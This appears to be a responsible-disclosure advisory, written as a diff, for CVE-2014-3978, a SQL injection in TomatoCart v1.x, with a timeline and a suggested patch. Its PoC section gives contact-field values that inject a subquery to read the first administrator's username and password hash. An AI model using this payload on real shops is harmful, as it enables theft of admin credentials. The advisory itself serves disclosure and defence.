@@ -1,0 +1,47 @@
+Title:
+    TomatoCart v1.x (latest-stable) Remote SQL Injection Vulnerability
+
+Background:
+    TomatoCart is open source ecommerce solution developed and maintained by a number of 64,000+ users from 50+ countries and regions. It's distributed under the terms of the GNU General Public License (or "GPL"), free to download and share. The community, including project founders and other developers, are supposed to work together on the platform of TomatoCart, contributing features, technical support and services. The current stable package is TomatoCart V1.1.8.6.1, while the latest development version is version 2.0 Alpha 4.  This exploit affects the "stable" tree.
+
+Timeline:
+    06 June 2014   - CVE-2014-3978 assigned
+    06 June 2014   - Submitted to vendor
+    25 June 2014   - Received inadequate patch from vendor
+    26 June 2014   - Suggested patch sent to vendor
+    17 July 2014   - Request for update from vendor, no response.
+    05 August 2014 - Pull request sent on github for full patch
+
+Status:
+    Vendor ignored, see suggested fix below.
+
+Released:
+    05 August 2014 - https://breaking.technology/advisories/CVE-2014-3978.txt
+
+Classification:
+    SQL Injection
+
+Exploit Complexity:
+    Low
+
+Severity:
+    High
+
+Description:
+    TomatoCart suffers from a systemic vulnerability in its query factory, allowing attackers to circumvent user input sanitizing to perform remote SQL injection. 
+
+    Required Information:
+    * Valid user account
+
+PoC:
+    Create a new contact in your address book using the following values. 
+
+    First name: :entry_lastname,
+    Last Name : ,(select user_name from toc_administrators order by id asc limit 1),(select user_password from toc_administrators order by id asc limit 1),3,4,5,6,7,8,9,10)# 
+    
+    The new contact will be added to your address book with the admin hash as the contact's street address 
+
+Suggested Action:
+    Pull request has been sent to the developers on github. Recommend patching the required to properly encode colon (:)
+    https://github.com/tomatocart/TomatoCart-v1/pull/238
+
